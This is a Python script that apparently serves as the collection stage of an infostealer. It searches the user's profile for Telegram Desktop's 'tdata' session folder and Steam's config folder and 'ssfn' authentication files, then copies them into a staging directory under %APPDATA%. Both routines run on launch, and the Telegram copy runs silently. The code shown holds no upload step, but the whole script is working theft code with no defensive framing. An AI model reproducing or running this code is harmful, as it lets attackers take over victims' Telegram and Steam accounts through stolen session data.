import os
import shutil
import psutil
from pathlib import Path

def find_tdata():
    """Look for Telegram 'tdata' in common locations under the current user's profile."""
    candidates = []

    appdata = os.getenv("APPDATA")      # usually %USERPROFILE%\AppData\Roaming
    localapp = os.getenv("LOCALAPPDATA")# usually %USERPROFILE%\AppData\Local
    userprofile = os.getenv("USERPROFILE")
    

    # Common explicit candidates
    if appdata:
        candidates.append(Path(appdata) / "Telegram Desktop" / "tdata")
        candidates.append(Path(appdata) / "Telegram" / "tdata")
    if localapp:
        candidates.append(Path(localapp) / "Telegram Desktop" / "tdata")
        candidates.append(Path(localapp) / "Programs" / "Telegram Desktop" / "tdata")
    if userprofile:
        candidates.append(Path(userprofile) / "AppData" / "Roaming" / "Telegram Desktop" / "tdata")
        candidates.append(Path(userprofile) / "AppData" / "Roaming" / "Telegram" / "tdata")

    # Check candidates first
    for p in candidates:
        if p.exists() and p.is_dir():
            return p

    # If not found, do a shallow search (only inside APPDATA and LOCALAPPDATA top-level)
    search_roots = []
    if appdata:
        search_roots.append(Path(appdata))
    if localapp:
        search_roots.append(Path(localapp))

    for root in search_roots:
        try:
            for child in root.iterdir():
                # look for folders whose name contains "Telegram"
                if child.is_dir() and "telegram" in child.name.lower():
                    tdata = child / "tdata"
                    if tdata.exists() and tdata.is_dir():
                        return tdata
        except PermissionError:
            # skip locations we can't read
            continue

    return None

def copy_tdata(src_tdata: Path, dest_base: Path):
    """Recursively copy files from src_tdata into dest_base keeping relative paths."""
    dest_base.mkdir(parents=True, exist_ok=True)
    files_copied = 0
    for root, dirs, files in os.walk(src_tdata):
        rel = Path(root).relative_to(src_tdata)
        target_dir = dest_base / rel
        target_dir.mkdir(parents=True, exist_ok=True)
        for f in files:
            src_file = Path(root) / f
            dest_file = target_dir / f
            try:
                shutil.copy2(src_file, dest_file)
                files_copied += 1
            except (PermissionError, OSError) as e:
                print(f"Skipped file (couldn't copy): {src_file} — {e}")
    return files_copied

def tele_st():
    # Find source tdata
    src = find_tdata()
    if not src:

        return

    # Build output folder: %APPDATA%\output\Applications\Telegram\tdata_<timestamp>
    appdata = os.getenv("APPDATA", str(Path.home() / "AppData" / "Roaming"))
    output_dir = Path(appdata) / "output" / "Applications" / "Telegram"
    output_dir.mkdir(parents=True, exist_ok=True)


    copied = copy_tdata(src, output_dir)



def steam_st():
    # Output folder
    output_dir = os.path.join(os.environ['APPDATA'], "output", "Applications", "Steam")
    os.makedirs(output_dir, exist_ok=True)

    # Steam paths
    steam_path = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam")
    if not os.path.exists(steam_path):
        print("Steam folder not found.")
        return

    steam_config_path = os.path.join(steam_path, "config")
    ssfn_files = [os.path.join(steam_path, file) for file in os.listdir(steam_path) if file.startswith("ssfn")]

    # Copy config files
    if os.path.exists(steam_config_path):
        for root, dirs, files in os.walk(steam_config_path):
            for file in files:
                src_file = os.path.join(root, file)
                rel_path = os.path.relpath(root, steam_path)
                dest_dir = os.path.join(output_dir, rel_path)
                os.makedirs(dest_dir, exist_ok=True)
                shutil.copy2(src_file, os.path.join(dest_dir, file))

    # Copy SSFN files
    for ssfn_file in ssfn_files:
        shutil.copy2(ssfn_file, os.path.join(output_dir, os.path.basename(ssfn_file)))

    print(f"Files copied to: {output_dir}")

steam_st()
tele_st()
